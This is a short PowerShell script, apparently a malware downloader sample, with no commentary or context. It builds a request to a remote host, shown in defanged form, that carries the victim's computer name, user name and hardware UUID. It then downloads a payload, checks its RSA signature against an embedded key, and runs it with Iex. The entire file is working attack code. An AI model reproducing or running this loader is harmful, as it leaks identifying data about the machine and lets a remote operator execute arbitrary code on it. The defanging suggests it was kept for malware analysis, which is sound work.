function a($u){
	$d=[text.encoding]::utf8.getbytes((new-object IO.StreamReader([net.webrequest]::create($u).getresponse().getresponsestream())).readtoend());
	
	$c=$d.count;
	
	if($c -gt 173){
		$b=$d[173..$c];
		$p=New-Object Security.Cryptography.RSAParameters;$p.Modulus=[convert]::FromBase64String("2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10=");
		
		$p.Exponent=0x01,0x00,0x01;
		
		$r=New-Object Security.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);
		
		if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(-join([char[]]$d[0..171])))){
			Iex(-join[char[]]$b)
		}
	}
}

$url="hxxp://t[.]zz3r0[.]com/a.jsp?_preex_20210419?"+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join"*");a($url)